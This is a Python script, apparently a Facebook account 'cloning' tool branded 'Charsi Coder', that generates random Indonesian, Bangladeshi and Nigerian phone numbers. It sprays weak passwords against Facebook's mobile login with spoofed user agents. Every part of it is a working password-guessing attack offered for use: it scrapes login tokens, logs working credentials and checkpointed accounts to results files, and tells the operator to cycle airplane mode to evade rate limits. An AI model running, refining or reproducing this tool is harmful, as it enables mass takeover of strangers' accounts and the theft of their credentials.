#--> Script Owner: Charsi Coder
#--> Method: Deep High Bashing
#--> Note: Dimag mat lagao, bas Airplane Mode on-off karo!

import os, sys, time, re, random, requests
from bs4 import BeautifulSoup as bs

#--> Charsi Green Theme (Nasheeli Green)
G = "\x1b[38;5;46m"  # Charsi Green
D = "\x1b[38;5;28m"  # Dark Green
W = "\x1b[38;5;231m" # White
R = "\x1b[38;5;196m" # Red
Y = "\x1b[38;5;226m" # Yellow

#--> Data
ok = []
cp = []

def clear():
    os.system('clear' if 'linux' in sys.platform.lower() else 'cls')

def charsi_logo():
    print(f"""{D}
     _______  _    _  _______  ______   _______  _________
    (_______)(_)  (_)(_______)(_____ \ (_______)(_________)
     _        _    _  _______  _____) ) _           _    
    | |      | |__| ||  ___  ||  __  / | |         | |   
    | |_____ |  __  || |   | || |  \ \ | |_____   _| |_  
     \______)(_)  (_)(_)   (_)(_)   (_)(_______) (_____)
    {G}      [#] NASHE MEIN DHUT - CLONING MEIN FAST [#]
    {W}      -------------------------------------------""")

class CharsiBypass:
    def __init__(self):
        self.ok_file = "Results/CHARSI_OK.txt"
        self.cp_file = "Results/CHARSI_CP.txt"
        if not os.path.exists('Results'): os.mkdir('Results')
        self.main_menu()

    def main_menu(self):
        clear()
        charsi_logo()
        print(f"{G}[1] {W}Indonesia Cloning (+62)  {D}- High Speed")
        print(f"{G}[2] {W}Bangladesh Cloning (+880) {D}- Stable")
        print(f"{G}[3] {W}Nigeria Cloning (+234)    {D}- Fresh Hits")
        print(f"{G}[0] {R}Exit Charsi World")
        
        opt = input(f"\n{D}┌─[{G}Charsi-Choice{D}]\n{D}└─{G}> {W}")
        
        if opt == '1': self.setup('ID', '+62', ['812','813','821','852','878','896'])
        elif opt == '2': self.setup('BD', '+880', ['17','18','19','13','15','16'])
        elif opt == '3': self.setup('NG', '+234', ['703','803','806','810','813','816'])
        else: sys.exit()

    def setup(self, country, code, sim_codes):
        clear()
        charsi_logo()
        print(f"{G}[#] Target Country: {W}{country}")
        print(f"{G}[#] SIM Codes: {W}{', '.join(sim_codes)}")
        
        sim = input(f"\n{D}┌─[{G}Select SIM Code{D}]\n{D}└─{G}> {W}")
        if sim not in sim_codes:
            print(f"{R}Sahi code daal be Charsi!{W}"); time.sleep(2); self.main_menu()
            
        try:
            limit = int(input(f"{G}[#] Kitni IDs udani hain (Limit): {W}"))
        except: limit = 5000
        
        print(f"\n{G}[!] Cloning Chalu Hai... {Y}Airplane Mode ON/OFF karte rehna!{W}\n")
        
        for _ in range(limit):
            number = sim + str(random.randint(1111111, 9999999))
            # Charsi Password Logic (Auto-Mix)
            passwords = [number, number[:6], number[:7], 'indonesia','bangladesh','nigeria','786786','123456','000000']
            self.crack(number, passwords, code)

    def crack(self, user, pws, code):
        global ok, cp
        # Fake Charsi UA (Latest Device)
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,13)}; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.0.0 Mobile Safari/537.36"
        
        for pw in pws:
            try:
                ses = requests.Session()
                link = ses.get('https://m.facebook.com/login/', headers={'User-Agent': ua}).text
                data = {
                    'lsd': re.search('name="lsd" value="(.*?)"', link).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', link).group(1),
                    'email': code + user,
                    'pass': pw,
                    'login': 'Log In'
                }
                res = ses.post('https://m.facebook.com/login/device-based/regular/login/', data=data, headers={'User-Agent': ua})
                
                if "c_user" in ses.cookies.get_dict():
                    print(f"\r{G}[CHARSI-OK] {code}{user} | {pw}{W}           ")
                    ok.append(user)
                    open(self.ok_file, "a").write(f"{code}{user}|{pw}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    print(f"\r{Y}[CHARSI-CP] {code}{user} | {pw}{W}           ")
                    cp.append(user)
                    open(self.cp_file, "a").write(f"{code}{user}|{pw}\n")
                    break
                else:
                    print(f"\r{D}[CH-CLONING] {user}..{W}", end="")
            except:
                pass

if __name__ == "__main__":
    CharsiBypass()
